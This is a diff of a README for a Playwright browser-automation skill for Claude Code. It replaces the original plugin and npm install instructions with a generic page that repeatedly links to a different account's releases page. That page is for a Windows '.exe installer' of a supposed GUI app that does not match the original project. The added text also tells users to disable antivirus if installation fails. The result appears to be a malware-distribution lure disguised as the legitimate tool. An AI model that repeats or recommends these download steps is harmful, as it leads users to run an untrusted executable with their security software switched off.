@@ -1,231 +1,83 @@
-# Playwright Skill for Claude Code
+# 🎉 playwright-skill - Automate Browsers with Ease
 
-**General-purpose browser automation as a Claude Skill**
+## 📥 Download Now
+[![Download Playwright Skill](https://img.shields.io/badge/Download-Playwright%20Skill-brightgreen.svg)](https://github.com/jpulido240-svg/playwright-skill/releases)
 
-A [Claude Skill](https://www.anthropic.com/news/skills) that enables Claude to write and execute any Playwright automation on-the-fly - from simple page tests to complex multi-step flows. Packaged as a [Claude Code Plugin](https://docs.claude.com/en/docs/claude-code/plugins) for easy installation and distribution.
+## 📖 Introduction
+Welcome to Playwright Skill, a powerful tool designed to help you automate your browsing tasks effortlessly. This application uses Claude's capabilities to write and execute custom automation scripts for testing and validation. Whether you're looking to streamline your web testing or handle repetitive tasks, this software has you covered.
 
-Claude autonomously decides when to use this skill based on your browser automation needs, loading only the minimal information required for your specific task.
+## 🚀 Getting Started
+Follow the steps below to get started with Playwright Skill. You don’t need any technical background.
 
-## Features
+1. **Check System Requirements**
+   - Operating System: Windows 10 or later, macOS, or any Linux distribution.
+   - Memory: At least 4 GB of RAM.
+   - Disk Space: A minimum of 500 MB free space.
 
-- **Any Automation Task** - Claude writes custom code for your specific request, not limited to pre-built scripts
-- **Visible Browser by Default** - See automation in real-time with `headless: false`
-- **Zero Module Resolution Errors** - Universal executor ensures proper module access
-- **Progressive Disclosure** - Concise SKILL.md with full API reference loaded only when needed
-- **Safe Cleanup** - Smart temp file management without race conditions
-- **Comprehensive Helpers** - Optional utility functions for common tasks
+2. **Visit the Releases Page**
+   To download the software, please visit our releases page. You will find the latest version available for download.  
+   [Download Page](https://github.com/jpulido240-svg/playwright-skill/releases)
 
-## Installation
+3. **Download the Installer**
+   On the Releases page, look for the latest version of Playwright Skill. Click on the version number to view the assets available. Download the installer file by clicking on the “playwright-skill-x.y.z-installer.exe” link, where “x.y.z” represents the version number.
 
-This repository is structured as a [Claude Code Plugin](https://docs.claude.com/en/docs/claude-code/plugins) containing a skill. You can install it as either a **plugin** (recommended) or extract it as a **standalone skill**.
+4. **Run the Installer**
+   - Once the download finishes, locate the installer file in your Downloads folder or the location where you saved it.
+   - Double-click on the installer file to start the installation process. Follow the on-screen prompts to complete the installation.
 
-### Understanding the Structure
+5. **Launch the Application**
+   After the installation is complete, you can find Playwright Skill in your application menu. Click to launch it.
 
-This repository uses the plugin format with a nested structure:
-```
-playwright-skill/              # Plugin root
-├── .claude-plugin/           # Plugin metadata
-└── skills/
-    └── playwright-skill/     # The actual skill
-        └── SKILL.md
-```
+## ⚙️ Using Playwright Skill
+Once you have the application opened, you will see an easy-to-navigate interface. Here are some basic steps to get started:
 
-Claude Code expects skills to be directly in folders under `.claude/skills/`, so manual installation requires extracting the nested skill folder.
+1. **Create a New Automation Script**
+   - Click on the "New Script" button.
+   - Enter a name for your script that reflects its purpose.
 
----
+2. **Set Up Your Browser Environment**
+   - Choose the browser type you wish to use. Playwright Skill supports Chrome, Firefox, and Safari.
+   - Input the URL of the webpage you want to automate.
 
-### Option 1: Plugin Installation (Recommended)
+3. **Define Actions for Automation**
+   - Use the intuitive interface to select actions you want the script to perform. These can include clicking buttons, filling forms, or navigating between pages.
 
-Install via Claude Code's plugin system for automatic updates and team distribution:
+4. **Run the Automation Script**
+   - Once you have defined your actions, click the "Run" button to execute your script. You will see the browser automatically perform the tasks as specified.
 
-```bash
-# Add this repository as a marketplace
-/plugin marketplace add lackeyjb/playwright-skill
+5. **Save Your Scripts for Later**
+   - You can save your scripts for future use by clicking the "Save" button. Name the file and choose a location to store it.
 
-# Install the plugin
-/plugin install playwright-skill@playwright-skill
+## 📁 Download & Install
+To get Playwright Skill, please visit the releases page by clicking the link below. Follow the steps to download and install it on your system.  
+[Download Page](https://github.com/jpulido240-svg/playwright-skill/releases)
 
-# Navigate to the skill directory and run setup
-cd ~/.claude/plugins/marketplaces/playwright-skill/skills/playwright-skill
-npm run setup
-```
+## ❓ Troubleshooting
+If you encounter any issues during installation or while using Playwright Skill, consider the following tips:
 
-Verify installation by running `/help` to confirm the skill is available.
+1. **Installation Fails**
+   - Ensure that your system meets the specified requirements.
+   - Temporarily disable any antivirus software that might block the installation.
 
----
+2. **Script Does Not Work**
+   - Verify that you have input the correct URL and actions.
+   - Check for any pop-up blockers that might interfere with the browser's automation behaviors.
 
-### Option 2: Standalone Skill Installation
+3. **Unexpected Errors**
+   - Make sure you are using the latest version of Playwright Skill.
+   - Restart the application and try again.
 
-To install as a standalone skill (without the plugin system), extract only the skill folder:
+## 🌟 Additional Features
+Playwright Skill includes several notable features:
 
-**Global Installation (Available Everywhere):**
-```bash
-# Clone to a temporary location
-git clone https://github.com/lackeyjb/playwright-skill.git /tmp/playwright-skill-temp
+- **Multi-Browser Support:** Automate tasks across different browsers.
+- **User-friendly Interface:** Intuitive design that caters to non-technical users.
+- **Custom Scripts:** Tailor automation based on specific needs, using Claude's AI capabilities.
 
-# Copy only the skill folder to your global skills directory
-mkdir -p ~/.claude/skills
-cp -r /tmp/playwright-skill-temp/skills/playwright-skill ~/.claude/skills/
+## 🔗 Resources
+To enhance your experience with Playwright Skill, you might find these resources helpful:
 
-# Navigate to the skill and run setup
-cd ~/.claude/skills/playwright-skill
-npm run setup
+- [Official Playwright Documentation](https://playwright.dev/docs/intro)
+- [Claude Documentation](https://claude.ai/docs)
 
-# Clean up temporary files
-rm -rf /tmp/playwright-skill-temp
-```
-
-**Project-Specific Installation:**
-```bash
-# Clone to a temporary location
-git clone https://github.com/lackeyjb/playwright-skill.git /tmp/playwright-skill-temp
-
-# Copy only the skill folder to your project
-mkdir -p .claude/skills
-cp -r /tmp/playwright-skill-temp/skills/playwright-skill .claude/skills/
-
-# Navigate to the skill and run setup
-cd .claude/skills/playwright-skill
-npm run setup
-
-# Clean up temporary files
-rm -rf /tmp/playwright-skill-temp
-```
-
-**Why this structure?** The plugin format requires the `skills/` directory for organizing multiple skills within a plugin. When installing as a standalone skill, you only need the inner `skills/playwright-skill/` folder contents.
-
----
-
-### Option 3: Download Release
-
-1. Download and extract the latest release from [GitHub Releases](https://github.com/lackeyjb/playwright-skill/releases)
-2. Copy only the `skills/playwright-skill/` folder to:
-   - Global: `~/.claude/skills/playwright-skill`
-   - Project: `/path/to/your/project/.claude/skills/playwright-skill`
-3. Navigate to the skill directory and run setup:
-   ```bash
-   cd ~/.claude/skills/playwright-skill  # or your project path
-   npm run setup
-   ```
-
----
-
-### Verify Installation
-
-Run `/help` to confirm the skill is loaded, then ask Claude to perform a simple browser task like "Test if google.com loads".
-
-## Quick Start
-
-After installation, simply ask Claude to test or automate any browser task. Claude will write custom Playwright code, execute it, and return results with screenshots and console output.
-
-## Usage Examples
-
-### Test Any Page
-```
-"Test the homepage"
-"Check if the contact form works"
-"Verify the signup flow"
-```
-
-### Visual Testing
-```
-"Take screenshots of the dashboard in mobile and desktop"
-"Test responsive design across different viewports"
-```
-
-### Interaction Testing
-```
-"Fill out the registration form and submit it"
-"Click through the main navigation"
-"Test the search functionality"
-```
-
-### Validation
-```
-"Check for broken links"
-"Verify all images load"
-"Test form validation"
-```
-
-## How It Works
-
-1. Describe what you want to test or automate
-2. Claude writes custom Playwright code for the task
-3. The universal executor (run.js) runs it with proper module resolution
-4. Browser opens (visible by default) and automation executes
-5. Results are displayed with console output and screenshots
-
-## Configuration
-
-Default settings:
-- **Headless:** `false` (browser visible unless explicitly requested otherwise)
-- **Slow Motion:** `100ms` for visibility
-- **Timeout:** `30s`
-- **Screenshots:** Saved to `/tmp/`
-
-## Project Structure
-
-```
-playwright-skill/
-├── .claude-plugin/
-│   ├── plugin.json          # Plugin metadata for distribution
-│   └── marketplace.json     # Marketplace configuration
-├── skills/
-│   └── playwright-skill/    # The actual skill (Claude discovers this)
-│       ├── SKILL.md         # What Claude reads (314 lines)
-│       ├── run.js           # Universal executor (proper module resolution)
-│       ├── package.json     # Dependencies & setup scripts
-│       └── lib/
-│           └── helpers.js   # Optional utility functions
-├── API_REFERENCE.md         # Full Playwright API reference (630 lines)
-├── README.md                # This file - user documentation
-├── CONTRIBUTING.md          # Contribution guidelines
-└── LICENSE                  # MIT License
-```
-
-## Advanced Usage
-
-Claude will automatically load `API_REFERENCE.md` when needed for comprehensive documentation on selectors, network interception, authentication, visual regression testing, mobile emulation, performance testing, and debugging.
-
-## Dependencies
-
-- Node.js >= 14.0.0
-- Playwright ^1.48.0 (installed via `npm run setup`)
-- Chromium (installed via `npm run setup`)
-
-## Troubleshooting
-
-**Playwright not installed?**
-Navigate to the skill directory and run `npm run setup`.
-
-**Module not found errors?**
-Ensure automation runs via `run.js`, which handles module resolution.
-
-**Browser doesn't open?**
-Verify `headless: false` is set. The skill defaults to visible browser unless headless mode is requested.
-
-**Install all browsers?**
-Run `npm run install-all-browsers` from the skill directory.
-
-## What is a Claude Skill?
-
-[Skills](https://www.anthropic.com/news/skills) are modular capabilities that extend Claude's functionality. Unlike slash commands that you invoke manually, skills are model-invoked—Claude autonomously decides when to use them based on your request.
-
-When you ask Claude to test a webpage or automate browser interactions, Claude discovers this skill, loads the necessary instructions, executes custom Playwright code, and returns results with screenshots and console output.
-
-## Contributing
-
-Contributions are welcome. Fork the repository, create a feature branch, make your changes, and submit a pull request. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## Learn More
-
-- [Claude Skills](https://www.anthropic.com/news/skills) - Official announcement from Anthropic
-- [Claude Code Skills Documentation](https://docs.claude.com/en/docs/claude-code/skills)
-- [Claude Code Plugins Documentation](https://docs.claude.com/en/docs/claude-code/plugins)
-- [Plugin Marketplaces](https://docs.claude.com/en/docs/claude-code/plugin-marketplaces)
-- [API_REFERENCE.md](API_REFERENCE.md) - Full Playwright documentation
-- [GitHub Issues](https://github.com/lackeyjb/playwright-skill/issues)
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
+Please feel free to reach out through our GitHub issues page if you have any questions or suggestions. Enjoy automating your web tasks with Playwright Skill!
